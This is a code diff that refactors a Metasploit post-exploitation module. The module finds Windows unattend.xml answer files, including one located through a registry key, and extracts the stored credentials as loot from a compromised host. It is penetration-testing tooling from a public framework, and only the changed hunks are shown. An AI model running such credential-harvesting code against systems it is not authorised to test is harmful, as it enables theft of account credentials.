@@ -1,15 +1,13 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex/parser/unattend'
 require 'rexml/document'
 
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::File
+  include Msf::Post::Windows::Registry
 
   def initialize(info={})
     super( update_info( info,
@@ -33,13 +31,13 @@ class Metasploit3 < Msf::Post
           ['URL', 'http://technet.microsoft.com/en-us/library/c026170e-40ef-4191-98dd-0b9835bfa580']
         ],
       'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
+      'SessionTypes'  => [ 'meterpreter','shell' ]
     ))
 
     register_options(
       [
         OptBool.new('GETALL', [true, 'Collect all unattend.xml that are found', true])
-      ], self.class)
+      ])
   end
 
 
@@ -47,8 +45,7 @@ class Metasploit3 < Msf::Post
   # Determine if unattend.xml exists or not
   #
   def unattend_exists?(xml_path)
-    x = session.fs.file.stat(xml_path) rescue nil
-    return !!x
+    exist?(xml_path)
   end
 
 
@@ -57,11 +54,7 @@ class Metasploit3 < Msf::Post
   #
   def load_unattend(xml_path)
     print_status("Reading #{xml_path}")
-    f = session.fs.file.new(xml_path)
-    raw = ""
-    until f.eof?
-      raw << f.read
-    end
+    raw = read_file(xml_path)
 
     begin
       xml = REXML::Document.new(raw)
@@ -81,7 +74,7 @@ class Metasploit3 < Msf::Post
     t = cred_table
     vprint_line("\n#{t.to_s}\n")
     p = store_loot('windows.unattended.creds', 'text/plain', session, t.to_csv, t.header, t.header)
-    print_status("#{t.header} saved as: #{p}")
+    print_good("#{t.header} saved as: #{p}")
   end
 
 
@@ -92,7 +85,7 @@ class Metasploit3 < Msf::Post
     return if data.empty?
     fname = ::File.basename(xmlpath)
     p = store_loot('windows.unattended.raw', 'text/plain', session, data)
-    print_status("Raw version of #{fname} saved as: #{p}")
+    print_good("Raw version of #{fname} saved as: #{p}")
   end
 
 
@@ -101,13 +94,8 @@ class Metasploit3 < Msf::Post
   #
   def get_registry_unattend_path
     # HKLM\System\Setup!UnattendFile
-    begin
-      key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SYSTEM')
-      fname = key.query_value('Setup!UnattendFile').data
-      return fname
-    rescue Rex::Post::Meterpreter::RequestError
-      return ''
-    end
+    fname = registry_getvaldata("HKEY_LOCAL_MACHINE\\System\\Setup", "UnattendFile")&.strip
+    return fname
   end
 
 
@@ -115,7 +103,7 @@ class Metasploit3 < Msf::Post
   # Initialize all 7 possible paths for the answer file
   #
   def init_paths
-    drive = session.sys.config.getenv('SystemDrive')
+    drive = expand_path('%SystemDrive%')
 
     files =
       [
@@ -141,8 +129,7 @@ class Metasploit3 < Msf::Post
 
     # If there is one for registry, we add it to the list too
     reg_path = get_registry_unattend_path
-    paths << reg_path unless reg_path.empty?
-
+    paths << reg_path unless reg_path.blank?
     return paths
   end
 
@@ -172,5 +159,4 @@ class Metasploit3 < Msf::Post
       return unless datastore['GETALL']
     end
   end
-
 end
